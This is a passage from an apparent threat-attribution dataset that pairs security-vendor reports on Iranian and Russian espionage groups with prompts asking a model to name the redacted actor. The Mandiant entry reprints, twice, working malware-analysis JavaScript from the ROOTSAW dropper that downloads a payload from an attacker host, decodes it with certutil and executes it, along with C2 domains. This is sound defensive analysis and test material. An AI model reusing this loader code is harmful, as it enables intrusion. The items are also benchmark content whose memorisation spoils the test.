hide in your systems to wait out the storm and steal information when it’s safe. Unfortunately, government-related entities are considered a prime candidate for exploitation or manipulation on the cybersecurity front.    Top cyber threats in 2024  How to Protect Yourself from [PLACEHOLDER] Hacker Group  Microsoft recommends several critical steps for defense contractors to defend against [PLACEHOLDER] and other advanced hacking groups: TABLIZE THE FOLLOWING    Reset credentials: Implement stringent password policies and immediately reset credentials for accounts targeted in spray attacks.  Revoke session cookies: Minimize attack surface by invalidating any previously established session cookies.  Secure accounts: Enforce multi-factor authentication (MFA) for all accounts, including those used for RDP and Windows Virtual Desktop.  Stay vigilant: Implement ongoing security training and awareness programs to educate employees about phishing and other common cyber threats.  The ever-evolving landscape of cyber threats demands constant vigilance and proactive measures. By remaining informed, prioritizing robust cybersecurity practices, and collaborating with security experts, defense contractors can safeguard their vital technologies and information from groups like [PLACEHOLDER].	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: Microsoft has recently revealed that [PLACEHOLDER], an Iranian cyber-espionage group also known as Peach Sandstorm, HOLMIUM, or Refined Kitten, is targeting defense contractors around the globe with a newly discovered backdoor malware called FalseFront. This targeted attack underscores the persistent threat these state-backed hackers pose to the security of sensitive technologies and information.    New Malware Attack on Government Defense Contractors  What is the New "FalseFront" Backdoor Malware Attack?  FalseFront is a custom-built backdoor malware that grants [PLACEHOLDER] operatives remote access to compromised systems, allowing them to execute programs and steal data within infected networks. Once stolen, it enables file transfer to its command-and-control (C2) servers.    FalseFront marks a worrying evolution in [PLACEHOLDER]’s capabilities. Its first observation in the wild dates back to early November 2023, indicating a relatively recent development. Microsoft also highlights that its design aligns with past [PLACEHOLDER] tactics, suggesting a continual refinement of their cyber-espionage toolset.    What is FalseFront backdoor malware  Defense Industrial Base (DIB) Targeted by Iranian Sponsored [PLACEHOLDER]  The [PLACEHOLDER] attacks specifically target the Defense Industrial Base (DIB), a network of over 100,000 defense companies and subcontractors responsible for researching and developing military weapons systems, subsystems, and components. This isn’t the first time [PLACEHOLDER] has set its sights on the DIB.    In September 2023, Microsoft reported a separate campaign involving extensive password spray attacks aimed at thousands of organizations, including several within the defense sector. Across 2023, [PLACEHOLDER] showed interest in US and other country’s organizations in satellite, defense, and pharmaceuticals. The September attack was a culmination of probes across the year, resulting in data theft from a limited number of victims in these sectors.    This persistence underlines the group’s unwavering focus on acquiring military secrets and potentially disrupting critical infrastructure. [PLACEHOLDER] has attacked sectors across the United States, Saudi Arabia, and South Korea over the past decade, with targets ranging from government, defense, and research, to finance and engineering.    Just two years ago, an Iran-linked hacking group known as DEV-0343 attacked US and Israeli defense technology companies. A stricter measure of cybersecurity control from businesses and those they rely on, chiefly Microsoft in this case, is necessary to ensure protection from foreign attacks and the loss of critical data.    Defense Industrial Base (DIB) targeted by hackers  Top 6 Cybersecurity Threats in 2024  Unfortunately, defense contractors don’t exist in a vacuum. Cyber-espionage campaigns targeting this sector are merely one piece of a larger puzzle. In recent years, defense agencies and contractors worldwide have faced relentless attacks from:    Russian state hackers: Espionage campaigns aimed at military intelligence and technological secrets.  North Korean hacking groups: Attempts to steal confidential information and potentially disrupt critical infrastructure.  Chinese cyber-espionage operations: Long-term efforts to acquire classified information and technological know-how.  This global landscape of cyber threats emphasizes the need for robust cybersecurity measures across the entire Defense Industrial Base.    In fact, this isn’t the first government-based security issue of 2023, with the CISA Citrix Sharefile Bug having occurred in September. That issue resulted in an uptick in suspicious activity, with many attempts to capitalize on the vulnerabilities caused by the bug. Many shady individuals are waiting to jump in and take as much as they can, or hide in your systems to wait out the storm and steal information when it’s safe. Unfortunately, government-related entities are considered a prime candidate for exploitation or manipulation on the cybersecurity front.    Top cyber threats in 2024  How to Protect Yourself from [PLACEHOLDER] Hacker Group  Microsoft recommends several critical steps for defense contractors to defend against [PLACEHOLDER] and other advanced hacking groups: TABLIZE THE FOLLOWING    Reset credentials: Implement stringent password policies and immediately reset credentials for accounts targeted in spray attacks.  Revoke session cookies: Minimize attack surface by invalidating any previously established session cookies.  Secure accounts: Enforce multi-factor authentication (MFA) for all accounts, including those used for RDP and Windows Virtual Desktop.  Stay vigilant: Implement ongoing security training and awareness programs to educate employees about phishing and other common cyber threats.  The ever-evolving landscape of cyber threats demands constant vigilance and proactive measures. By remaining informed, prioritizing robust cybersecurity practices, and collaborating with security experts, defense contractors can safeguard their vital technologies and information from groups like [PLACEHOLDER].
https://www.mandiant.com/resources/blog/apt29-wineloader-german-political-parties	In late February 2024, Mandiant identified [PLACEHOLDER] — a Russian Federation backed threat group linked by multiple governments to Russia’s Foreign Intelligence Service (SVR) — conducting a phishing campaign targeting German political parties. Consistent with [PLACEHOLDER] operations extending back to 2021, this operation leveraged [PLACEHOLDER]’s mainstay first-stage payload ROOTSAW (aka EnvyScout) to deliver a new backdoor variant publicly tracked as WINELOADER.     Notably, this activity represents a departure from this [PLACEHOLDER] initial access cluster’s typical remit of targeting governments, foreign embassies, and other diplomatic missions, and is the first time Mandiant has seen an operational interest in political parties from this [PLACEHOLDER] subcluster. Additionally, while [PLACEHOLDER] has previously used lure documents bearing the logo of German government organizations, this is the first instance where we have seen the group use German-language lure content — a possible artifact of the targeting differences (i.e. domestic vs. foreign) between the two operations.     Phishing emails were sent to victims purporting to be an invite to a dinner reception on 01 March bearing a logo from the Christian Democratic Union (CDU), a major political party in Germany (see Figure 1).   The German-language lure document contains a phishing link directing victims to a malicious ZIP file containing a ROOTSAW dropper hosted on an actor-controlled compromised website “https://waterforvoiceless[.]org/invite.php”.   ROOTSAW delivered a second-stage CDU-themed lure document and a next stage WINELOADER payload retrieved from “waterforvoiceless[.]org/util.php”.   WINELOADER was first observed in operational use in late January 2024 in an operation targeting likely diplomatic entities in Czechia, Germany, India, Italy, Latvia, and Peru.   The backdoor contains several features and functions that overlap with several known [PLACEHOLDER] malware families including BURNTBATTER, MUSKYBEAT and BEATDROP, indicating they are likely created by a common developer (see Technical Annex for additional details).  Lure document redirecting victims to an [PLACEHOLDER] controlled compromised WordPress website hosting ROOTSAW  Figure 1: Lure document redirecting victims to an [PLACEHOLDER] controlled compromised WordPress website hosting ROOTSAW  Second CDU lure displayed by ROOTSAW downloader  Figure 2: Second CDU lure displayed by ROOTSAW downloader  Outlook & Implications  ROOTSAW continues to be the central component of [PLACEHOLDER]’s initial access efforts to collect foreign political intelligence. The first-stage malware’s expanded use to target German political parties is a noted departure from the typical diplomatic focus of this [PLACEHOLDER] subcluster, and almost certainly reflects the SVR’s interest in gleaning information from political parties and other aspects of civil society that could advance Moscow’s geopolitical interests.     As highlighted in our previous research detailing [PLACEHOLDER]’s operations in the first-half of 2023, these malware delivery operations are highly adaptive, and continue to evolve in lockstep with Russia’s geopolitical realities. We therefore suspect that [PLACEHOLDER]’s interest in  these organizations is unlikely to be limited to Germany. Western political parties and their associated bodies from across the political spectrum are likely also possible targets for future SVR-linked cyber espionage activity given Moscow’s vital interest in understanding changing Western political dynamics related to Ukraine and other flashpoint foreign policy issues.     Based on recent activity from other [PLACEHOLDER] subclusters, attempts to achieve initial access beyond phishing may include attempts to subvert cloud-based authentication mechanisms or brute force methods such as password spraying. For more details regarding [PLACEHOLDER]’s recent tactics, please see the February 2024 advisory from the United Kingdom’s National Cyber Security Center (NCSC).    Technical Annex  Initial Access  Starting as early as 26 February 2024, [PLACEHOLDER] distributed phishing attachments containing links to an actor-controlled compromise website, “waterforvoiceless[.]org/invite.php”, to redirect victims to a ROOTSAW dropper. This ROOTSAW variant uses the same JavaScript obfuscation resource used in previous [PLACEHOLDER] operations, and ultimately results in a request to download and execute the second stage WINELOADER from the same server at  “waterforvoiceless[.]org/util.php”.     The ROOTSAW payload contains a  JSObfuscated payload, that when parsed, results in the following code that is responsible for downloading a file to disk as “invite.txt”, decoding it using Windows Certutil, then decompressing the code using tar. Finally, the legitimate Windows binary (SqlDumper.exe) is executed by the actor.    var a = new ActiveXObject("Wscript.Shell");    function Ijdaskjw(_0x559297) {      var _0x3bd487 = new XMLHttpRequest();      _0x3bd487.onreadystatechange = function () {        if (_0x3bd487.readyState == 0x4 && _0x3bd487.status == 0xc8) {          var _0x11aa10 = _0x3bd487.response;          var _0xce698d = new ActiveXObject("Scripting.FileSystemObject");          var _0x20081c = _0xce698d.OpenTextFile("C:\\Windows\\Tasks  \\invite.txt", 0x2, true, 0x0);          _0x20081c.Write(_0x11aa10);          _0x20081c.close();          a.Run("certutil -decode C:\\Windows\\Tasks\\invite.txt   C:\\Windows\\Tasks\\invite.zip", 0x0);          var _0x245d53 = Date.now();          var _0x3f9f72 = null;          do {            _0x3f9f72 = Date.now();          } while (_0x3f9f72 - _0x245d53 < 0xbb8);          a.Run("tar -xf C:\\Windows\\Tasks\\invite.zip -C C:\\Windows\\Tasks\\ ", 0x0);          var _0x245d53 = Date.now();          var _0x3f9f72 = null;          do {            _0x3f9f72 = Date.now();          } while (_0x3f9f72 - _0x245d53 < 0xdac);          a.Run("C:\\Windows\\Tasks\\SqlDumper.exe", 0x0);        }      };      _0x3bd487.open("GET", _0x559297, true);      _0x3bd487.send(null);    }    Ijdaskjw("https://waterforvoiceless.org/util.php");    Invite.pdf (MD5: fb6323c19d3399ba94ecd391f7e35a9c)  Second CDU-themed PDF lure document  Written in LibreOffice 6.4 by default user “Writer”  Metadata documents the PDF as en-GB language  Links to https://waterforvoiceless[.]org/invite.php  invite.php (MD5: 7a465344a58a6c67d5a733a815ef4cb7)  Zip file containing ROOTSAW  Downloaded from https://waterforvoiceless[.]org/invite.php  Executes efafcd00b9157b4146506bd381326f39  invite.hta (MD5: efafcd00b9157b4146506bd381326f39)  ROOTSAW downloader containing obfuscated code  Downloads from https://waterforvoiceless[.]org/util.php  Extracts 44ce4b785d1795b71cee9f77db6ffe1b  Executes f32c04ad97fa25752f9488781853f0ea  invite.txt (MD5: 44ce4b785d1795b71cee9f77db6ffe1b)  Malicious certificate file, extracted using Windows Certutil  Executed from efafcd00b9157b4146506bd381326f39  Downloaded from https://waterforvoiceless[.]org/util.php  invite.zip (MD5: 5928907c41368d6e87dc3e4e4be30e42)  Malicious zip containing WINELOADER  Extracted from 44ce4b785d1795b71cee9f77db6ffe1b  Contains e017bfc36e387e8c3e7a338782805dde  Contains f32c04ad97fa25752f9488781853f0ea  sqldumper.exe (MD5: f32c04ad97fa25752f9488781853f0ea)  Legitimate Microsoft file Sqldumper used for side loading  Analysis of WINELOADER  WINELOADER is likely a variant of the non-public historic BURNTBATTER and MUSKYBEAT code families which Mandiant uniquely associates with [PLACEHOLDER]. It shares a similar design and pattern, specifically around the invocation of the malware and the anti-analysis techniques used. However, the code family itself is considerably more customized than the previous variants, as it no longer uses publicly available loaders like DONUT or DAVESHELL and implements a unique C2 mechanism. Additionally, WINELOADER contains the following shared techniques with other code families used by [PLACEHOLDER]:    The RC4 algorithm used to decrypt the next stage payload;  Process/DLL name check to validate the payload context (in use since early BEATDROP variants);  Ntdll usermode hook bypass (in use since early BEATDROP variants).  WINELOADER is invoked via a DLL side loading technique into a legitimate Windows executable and starts to decrypt the main implant logic itself using RC4. This first layer of deobfuscation was first witnessed in the MUSKYBEAT/BURNTBATTER malware families and was originally used to decrypt a second file also stored in the zip file. Within WINELOADER, it is used to decrypt a region of memory containing the actual WINELOADER module. This module is a compiled position independent shellcode which contains references within itself to strings and decryption modules.     The decryption function then moves execution to this position independent shellcode. ZScaler refers to this resource as the WINELOADER core module, and notes that it contains settings (C2 information, RC4 decryption keys) and strings. Based on samples identified by Mandiant, the WINELOADER resource contains 70 encrypted strings and both samples have the default sleep timer of 2 seconds configured.    WINELOADER communicates using HTTP GET requests using a user agent contained within the resource. Each packet to the C2 server contains a random size registration packet, this packet contains environment information like the victim’s username/device name, the process name and some information that could be used by the actor to determine whether the compromised system is a valid target (parent process path, etc.). The response from the C2 server can task the WINELOADER to execute a new module (either within the same process, or via process injection) and to update the sleep timer.     Although Mandiant was unable to obtain commands from the actor, ZScaler reported that they were able to receive a command to persist WINELOADER which resulted in a run key to be configured on the device.     vcruntime140.dll (MD5: 8bd528d2b828c9289d9063eba2dc6aa0)  WINELOADER downloader  Communicates to https://siestakeying[.]com/auth.php  Vcruntime140.dll (MD5: e017bfc36e387e8c3e7a338782805dde)  WINELOADER downloader   Communicates to https://siestakeying[.]com/auth.php	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: In late February 2024, Mandiant identified [PLACEHOLDER] — a Russian Federation backed threat group linked by multiple governments to Russia’s Foreign Intelligence Service (SVR) — conducting a phishing campaign targeting German political parties. Consistent with [PLACEHOLDER] operations extending back to 2021, this operation leveraged [PLACEHOLDER]’s mainstay first-stage payload ROOTSAW (aka EnvyScout) to deliver a new backdoor variant publicly tracked as WINELOADER.     Notably, this activity represents a departure from this [PLACEHOLDER] initial access cluster’s typical remit of targeting governments, foreign embassies, and other diplomatic missions, and is the first time Mandiant has seen an operational interest in political parties from this [PLACEHOLDER] subcluster. Additionally, while [PLACEHOLDER] has previously used lure documents bearing the logo of German government organizations, this is the first instance where we have seen the group use German-language lure content — a possible artifact of the targeting differences (i.e. domestic vs. foreign) between the two operations.     Phishing emails were sent to victims purporting to be an invite to a dinner reception on 01 March bearing a logo from the Christian Democratic Union (CDU), a major political party in Germany (see Figure 1).   The German-language lure document contains a phishing link directing victims to a malicious ZIP file containing a ROOTSAW dropper hosted on an actor-controlled compromised website “https://waterforvoiceless[.]org/invite.php”.   ROOTSAW delivered a second-stage CDU-themed lure document and a next stage WINELOADER payload retrieved from “waterforvoiceless[.]org/util.php”.   WINELOADER was first observed in operational use in late January 2024 in an operation targeting likely diplomatic entities in Czechia, Germany, India, Italy, Latvia, and Peru.   The backdoor contains several features and functions that overlap with several known [PLACEHOLDER] malware families including BURNTBATTER, MUSKYBEAT and BEATDROP, indicating they are likely created by a common developer (see Technical Annex for additional details).  Lure document redirecting victims to an [PLACEHOLDER] controlled compromised WordPress website hosting ROOTSAW  Figure 1: Lure document redirecting victims to an [PLACEHOLDER] controlled compromised WordPress website hosting ROOTSAW  Second CDU lure displayed by ROOTSAW downloader  Figure 2: Second CDU lure displayed by ROOTSAW downloader  Outlook & Implications  ROOTSAW continues to be the central component of [PLACEHOLDER]’s initial access efforts to collect foreign political intelligence. The first-stage malware’s expanded use to target German political parties is a noted departure from the typical diplomatic focus of this [PLACEHOLDER] subcluster, and almost certainly reflects the SVR’s interest in gleaning information from political parties and other aspects of civil society that could advance Moscow’s geopolitical interests.     As highlighted in our previous research detailing [PLACEHOLDER]’s operations in the first-half of 2023, these malware delivery operations are highly adaptive, and continue to evolve in lockstep with Russia’s geopolitical realities. We therefore suspect that [PLACEHOLDER]’s interest in  these organizations is unlikely to be limited to Germany. Western political parties and their associated bodies from across the political spectrum are likely also possible targets for future SVR-linked cyber espionage activity given Moscow’s vital interest in understanding changing Western political dynamics related to Ukraine and other flashpoint foreign policy issues.     Based on recent activity from other [PLACEHOLDER] subclusters, attempts to achieve initial access beyond phishing may include attempts to subvert cloud-based authentication mechanisms or brute force methods such as password spraying. For more details regarding [PLACEHOLDER]’s recent tactics, please see the February 2024 advisory from the United Kingdom’s National Cyber Security Center (NCSC).    Technical Annex  Initial Access  Starting as early as 26 February 2024, [PLACEHOLDER] distributed phishing attachments containing links to an actor-controlled compromise website, “waterforvoiceless[.]org/invite.php”, to redirect victims to a ROOTSAW dropper. This ROOTSAW variant uses the same JavaScript obfuscation resource used in previous [PLACEHOLDER] operations, and ultimately results in a request to download and execute the second stage WINELOADER from the same server at  “waterforvoiceless[.]org/util.php”.     The ROOTSAW payload contains a  JSObfuscated payload, that when parsed, results in the following code that is responsible for downloading a file to disk as “invite.txt”, decoding it using Windows Certutil, then decompressing the code using tar. Finally, the legitimate Windows binary (SqlDumper.exe) is executed by the actor.    var a = new ActiveXObject("Wscript.Shell");    function Ijdaskjw(_0x559297) {      var _0x3bd487 = new XMLHttpRequest();      _0x3bd487.onreadystatechange = function () {        if (_0x3bd487.readyState == 0x4 && _0x3bd487.status == 0xc8) {          var _0x11aa10 = _0x3bd487.response;          var _0xce698d = new ActiveXObject("Scripting.FileSystemObject");          var _0x20081c = _0xce698d.OpenTextFile("C:\\Windows\\Tasks  \\invite.txt", 0x2, true, 0x0);          _0x20081c.Write(_0x11aa10);          _0x20081c.close();          a.Run("certutil -decode C:\\Windows\\Tasks\\invite.txt   C:\\Windows\\Tasks\\invite.zip", 0x0);          var _0x245d53 = Date.now();          var _0x3f9f72 = null;          do {            _0x3f9f72 = Date.now();          } while (_0x3f9f72 - _0x245d53 < 0xbb8);          a.Run("tar -xf C:\\Windows\\Tasks\\invite.zip -C C:\\Windows\\Tasks\\ ", 0x0);          var _0x245d53 = Date.now();          var _0x3f9f72 = null;          do {            _0x3f9f72 = Date.now();          } while (_0x3f9f72 - _0x245d53 < 0xdac);          a.Run("C:\\Windows\\Tasks\\SqlDumper.exe", 0x0);        }      };      _0x3bd487.open("GET", _0x559297, true);      _0x3bd487.send(null);    }    Ijdaskjw("https://waterforvoiceless.org/util.php");    Invite.pdf (MD5: fb6323c19d3399ba94ecd391f7e35a9c)  Second CDU-themed PDF lure document  Written in LibreOffice 6.4 by default user “Writer”  Metadata documents the PDF as en-GB language  Links to https://waterforvoiceless[.]org/invite.php  invite.php (MD5: 7a465344a58a6c67d5a733a815ef4cb7)  Zip file containing ROOTSAW  Downloaded from https://waterforvoiceless[.]org/invite.php  Executes efafcd00b9157b4146506bd381326f39  invite.hta (MD5: efafcd00b9157b4146506bd381326f39)  ROOTSAW downloader containing obfuscated code  Downloads from https://waterforvoiceless[.]org/util.php  Extracts 44ce4b785d1795b71cee9f77db6ffe1b  Executes f32c04ad97fa25752f9488781853f0ea  invite.txt (MD5: 44ce4b785d1795b71cee9f77db6ffe1b)  Malicious certificate file, extracted using Windows Certutil  Executed from efafcd00b9157b4146506bd381326f39  Downloaded from https://waterforvoiceless[.]org/util.php  invite.zip (MD5: 5928907c41368d6e87dc3e4e4be30e42)  Malicious zip containing WINELOADER  Extracted from 44ce4b785d1795b71cee9f77db6ffe1b  Contains e017bfc36e387e8c3e7a338782805dde  Contains f32c04ad97fa25752f9488781853f0ea  sqldumper.exe (MD5: f32c04ad97fa25752f9488781853f0ea)  Legitimate Microsoft file Sqldumper used for side loading  Analysis of WINELOADER  WINELOADER is likely a variant of the non-public historic BURNTBATTER and MUSKYBEAT code families which Mandiant uniquely associates with [PLACEHOLDER]. It shares a similar design and pattern, specifically around the invocation of the malware and the anti-analysis techniques used. However, the code family itself is considerably more customized than the previous variants, as it no longer uses publicly available loaders like DONUT or DAVESHELL and implements a unique C2 mechanism. Additionally, WINELOADER contains the following shared techniques with other code families used by [PLACEHOLDER]:    The RC4 algorithm used to decrypt the next stage payload;  Process/DLL name check to validate the payload context (in use since early BEATDROP variants);  Ntdll usermode hook bypass (in use since early BEATDROP variants).  WINELOADER is invoked via a DLL side loading technique into a legitimate Windows executable and starts to decrypt the main implant logic itself using RC4. This first layer of deobfuscation was first witnessed in the MUSKYBEAT/BURNTBATTER malware families and was originally used to decrypt a second file also stored in the zip file. Within WINELOADER, it is used to decrypt a region of memory containing the actual WINELOADER module. This module is a compiled position independent shellcode which contains references within itself to strings and decryption modules.     The decryption function then moves execution to this position independent shellcode. ZScaler refers to this resource as the WINELOADER core module, and notes that it contains settings (C2 information, RC4 decryption keys) and strings. Based on samples identified by Mandiant, the WINELOADER resource contains 70 encrypted strings and both samples have the default sleep timer of 2 seconds configured.    WINELOADER communicates using HTTP GET requests using a user agent contained within the resource. Each packet to the C2 server contains a random size registration packet, this packet contains environment information like the victim’s username/device name, the process name and some information that could be used by the actor to determine whether the compromised system is a valid target (parent process path, etc.). The response from the C2 server can task the WINELOADER to execute a new module (either within the same process, or via process injection) and to update the sleep timer.     Although Mandiant was unable to obtain commands from the actor, ZScaler reported that they were able to receive a command to persist WINELOADER which resulted in a run key to be configured on the device.     vcruntime140.dll (MD5: 8bd528d2b828c9289d9063eba2dc6aa0)  WINELOADER downloader  Communicates to https://siestakeying[.]com/auth.php  Vcruntime140.dll (MD5: e017bfc36e387e8c3e7a338782805dde)  WINELOADER downloader   Communicates to https://siestakeying[.]com/auth.php
https://www.cyberark.com/resources/blog/apt29s-attack-on-microsoft-tracking-cozy-bears-footprints	A new and concerning chapter has unfolded in these troubled times of geopolitical chaos. The Cozy Bear threat actor has caused significant breaches targeting Microsoft and HPE, and more are likely to come. These recent events have sent shockwaves throughout the tech community, and for good reason. As we continue to uncover the fallout from these breaches, it has become apparent that the magnitude of the incident is more significant than we first realized. Today’s blog post sheds light on who exactly [PLACEHOLDER] is, its motives, what tactics it continues to use – and ultimately, how organizations might prevent similar attacks from happening to them.    Who’s Behind the Microsoft Attack and Why?  The U.S. government has classified this threat actor as the advanced persistent threat [PLACEHOLDER]. The group also goes by many other names, such as CozyCar, The Dukes, CozyDuke, Midnight Blizzard (as Microsoft calls them), Dark Halo, NOBELIUM and UNC2452. Most people, however, know it by the moniker Cozy Bear. This group has rightfully earned a reputation as one of the world’s most advanced and elusive espionage groups.    In reviewing security camera footage, the Dutch government determined that the Russian Foreign Intelligence Service (or SVR) led this group. [PLACEHOLDER]’s primary objectives include acquiring political, economic and military intelligence to gain a competitive advantage, supporting geopolitical goals and enhancing Russia’s influence on the global stage. The group’s long-term and covert approach reflects its commitment to achieving sustained access to sensitive information, allowing it to conduct strategic operations over an extended period.    Industry experts generally agree that this threat actor formed in 2008 and has been targeting government entities, think tanks and critical infrastructure since 2010. Cozy Bear has since been linked to several high-profile cyber-attacks, including the 2016 breach of the Democratic National Committee (DNC), the SolarWinds supply chain attack of 2019 and the Republican National Committee (RNC) in 2021. This threat actor is known to be extremely patient and cautious. Cozy Bear sometimes dwells inside a network for years if the target is valuable enough.    Quick aside: An interesting thing to note is that the SolarWinds breach was the first time an attack method called Golden SAML was documented in the wild. The attack method was first discovered by CyberArk Labs’ Shaked Reiner in 2017.    What Happened to Microsoft (What We Know So Far)  On Jan. 12, Microsoft detected a threat actor who gained access to a small percentage of corporate email accounts, exfiltrated emails and attached documents of high-value targets, including those of senior leadership, cybersecurity and legal teams, along with other internal employee identities.    Based on the details provided by Microsoft at the time of this writing, it appears the initial objective of the attack was to acquire information. Once inside target email accounts, Cozy Bear searched for specific information about, well, Cozy Bear. The group likely wanted to better understand its adversary (the intelligence teams gathering information on it) and discover the countermeasures intended to lure and stop it. Examples of what the threat actor might be interested in include indicators of compromise (IoC), exposed cloud infrastructure used by the attacker, IP ranges and known tactics, techniques and procedures (TTPs).    Analyzing the Microsoft Breach  Based on the information provided by Microsoft on Jan. 19, it appears the threat actor gained access to a “legacy, non-production test tenant account” through a password spray attack.    Password spraying is a brute-force attack where the attacker slowly tries a list of passwords against accounts from various source IP addresses. This simple attack keeps the number of requests below the standard rate limit to stop rapid login attempts from single IP addresses. This technique helps its attacker avoid detection by not locking out user accounts due to multiple failed login attempts, a common identity threat detection and response (ITDR) capability offered in access management and privileged access management (PAM) solutions. This type of attack is significantly slower but much more difficult to detect. Subsequently, password spraying has a much higher chance of succeeding.    Using this technique, the attacker compromised and accessed the account. The question that comes to mind is, if this was publicly facing, why was multi-factor authentication (MFA) not part of the authentication flow?    In this situation, the permissions set was limited. However, the test account had access to an OAuth application that had elevated access into their corporate environment. Although this was deemed a “legacy” account, it still was authorized to access the production systems. This coverage gap is a familiar blind spot for many organizations; even with great technical controls to implement least privilege access, people and processes (such as ongoing entitlement reviews) remain essential elements of identity security programs.    At this point, the attacker created a series of malicious OAuth applications that enabled them to have multiple hooks into the target, providing higher persistence while making the defender’s job even harder. Afterward, the threat actor created a new user account to grant access to the Microsoft corporate environment for the other newly created and malicious OAuth applications. Then, the attacker used the initial compromised legacy test OAuth application to grant the newly created OAuth apps the Office 365 Exchange Online *full_access_as_app* role. This role typically grants extensive access and privileges to an application – which, in this case, allowed access to target mailboxes.    The granted privilege here is meaningful because it enabled the adversary to read and exfiltrate emails and attachments. This unauthorized connection was accomplished by generating valid access tokens to Microsoft’s Exchange server, even if the original user was not allowed to do so.    Surmised Microsoft Attack Flow  Microsoft Attack Flow    The graphic above charts [PLACEHOLDER]’s steps:    Performed reconnaissance to identify potential victims (e.g., through LinkedIn, OSINT).  Performed password spraying attack on the identified entities discovered in step 1.  Accessed the compromised account (legacy test tenant).  Escalated privileges by accessing an OAuth application with elevated privileges to the corporate environment.  Created a few malicious OAuth applications.  Created a new user account to grant consent in the Microsoft corporate environment for the malicious apps created in step 5.  Granted the malicious apps Office 365 Exchange Online *full_access_as_app* role using the credentials gained from step 4.  Read and exfiltrated emails belonging to Microsoft’s executive leadership team and security staff.  Prerequisite Misconfiguration Assumptions  Based on the information disclosed, we assume that certain misconfigurations were present:    Access to an OAuth application with elevated permissions to the internal environment.  Privileges allowing the creation of OAuth apps and users.  Privileges for reading emails.  It’s also worth mentioning that even though this attack created limited practical impact (stolen emails and file attachments), it can still escalate damage through various other paths, such as the exfiltration of regulated data or the disruption of systems.    What Your Organization Can Do to Help Prevent a Similar Attack  Protect Your Non-production Environments  One common mistake IT organizations make is that under-protected development environments are exposed to the internet, allowing access to threat actors. These environments should be segmented and not easily accessible from outside an organization’s perimeter. Organizations should extend cybersecurity controls in production environments into non-production environments – failure to follow best practices cause data breaches.    Another common mistake I see organizations make is using unsensitized data in test environments, allowing easy exfiltration. End user emails and attachments were not present in the legacy tenant. Still, Microsoft admitted it used the same credentials in its production environment and this legacy tenant. The threat actor’s ability to pivot and access production data resulted from reusing privileged credentials and the absence of segmenting nonproduction and production environments.    Because organizations cannot implicitly trust that best practices are adhered to by the people implementing the environments, we need to extend multiple controls, such as MFA, to environments outside of production. Everyone knows that MFA is important. That said, many organizations, including one of the largest tech giants in the world, didn’t use it correctly, at least in this case. Additionally, we must assume that systems are not always set up securely. Misconfigurations and accounts being over-provisioned are inevitable, which is why we preach taking a defense-in-depth approach to cybersecurity. Leveraging controls like least privilege and MFA to non-production environments is incredibly important.    Implement Identity Threat Detection and Response (ITDR)  The ATP29 attack on Microsoft is a textbook example of how ITDR is critical to an organization.    Starting with the initial access through password spray using a proxy, the lack of MFA followed – and the creation of privileged OAuth applications eventually led to generating a user account with a sensitive privilege … All these actions had the potential for detection and response.    Like every element of cybersecurity, ITDR capabilities are more effective when tightly integrated into an identity fabric that proactively reduces risk rather than waiting for an attack to be detected. CyberArk Labs is working on a project in the ITDR world, and we are pleased to share that our suggested ITDR list of rules covers most aspects of the attack.    Defenders should re-evaluate the effectiveness of their password spray detections against the “low volume” style of attack described above. The focus on OAuth emphasizes the importance of such detections and the need for a comprehensive ITDR solution covering both on-prem and Cloud aspects.    An additional line of defense includes having controls to prevent credentials reuse and to rotate all credentials consistently according to organizational policy. Finally, detecting the entry of risky commands could have further reduced the risk of this attack by limiting lateral and vertical movement.    Security teams should carefully review every impersonation action between non-human and human entities. Require administrative privileges for the OAuth application approval process (Consent).    Suggested ITDR Detections and Responses  The following recommendations correspond to password spraying attacks, OAuth abuse, and other malicious actions. You can monitor the following events to detect:    Login without MFA (and respond automatically, accordingly)  Reuse of authentication credentials and force rotation  Suspicious creation or reactivation of OAuth applications  The idle activity of an OAuth application  New admin privileges granted to a user and try to add correlation with deviation from an approved organizational process for changing and adding privileges (e.g., the need to open an IT support ticket or to authenticate with MFA again)  The activity of a user without a prior explicit user authentication (or session start event)  MFA-configured user behavior without a prior MFA check  Attempted actions that failed due to the post-expiration time of the credentials\tokens\cookie used  Entry of malicious commands  Attempts to bypass privileged access management solutions  User login using a proxy  The Time to Act is Now (and Always)  This recent attack on Microsoft is a stark reminder of the persistent and sophisticated threats from nation-state threat actors. And it isn’t likely the last we’ll see from Cozy Bear. Days after Microsoft’s breach announcement, other organizations have also announced they had fallen victim to this threat actor. CyberArk Labs expects that more attacks will continue to become public now that these indicators of compromise are available to everyone. It’s also essential to acknowledge that the threat landscape is not limited to a single actor or nation. Other states are actively developing and refining their cyber capabilities, ready to launch similar attacks with varying motives.    The attack is also a sobering glimpse into the future of cyber warfare. It serves as a call to action for heightened vigilance, collaboration and investment in cybersecurity. The looming specter of nation-state cyberattacks demands our attention, and the time to fortify ourselves is now. Ignoring these warnings would be to our peril. As a global community, we must work collectively to safeguard our digital infrastructure from the growing threat of nation-state cyber aggression.	You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.  Threat Report: A new and concerning chapter has unfolded in these troubled times of geopolitical chaos. The Cozy Bear threat actor has caused significant breaches targeting Microsoft and HPE, and more are likely to come. These recent events have sent shockwaves throughout the tech community, and for good reason. As we continue to uncover the fallout from these breaches, it has become apparent that the magnitude of the incident is more significant than we first realized. Today’s blog post sheds light on who exactly [PLACEHOLDER] is, its motives, what tactics it continues to use – and ultimately, how organizations might prevent similar attacks from happening to them.    Who’s Behind the Microsoft Attack and Why?  The U.S. government has classified this threat actor as the advanced persistent threat [PLACEHOLDER]. The group also goes by many other names, such as CozyCar, The Dukes, CozyDuke, Midnight Blizzard (as Microsoft calls them), Dark Halo, NOBELIUM and UNC2452. Most people, however, know it by the moniker Cozy Bear. This group has rightfully earned a reputation as one of the world’s most advanced and 